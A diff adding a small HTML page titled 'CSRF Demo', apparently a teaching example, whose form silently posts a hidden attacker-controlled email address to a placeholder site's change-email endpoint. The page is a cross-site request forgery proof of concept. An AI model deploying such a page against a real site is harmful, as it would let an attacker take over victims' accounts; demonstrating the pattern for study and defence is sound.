@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>CSRF Demo</title>
+</head>
+<body>
+  <h1>Fake Change Email Form</h1>
+
+  <form action="https://example.com/change-email" method="POST">
+    <input type="hidden" name="email" value="attacker@example.com">
+    <button type="submit">Change Email</button>
+  </form>
+</body>
+</html>
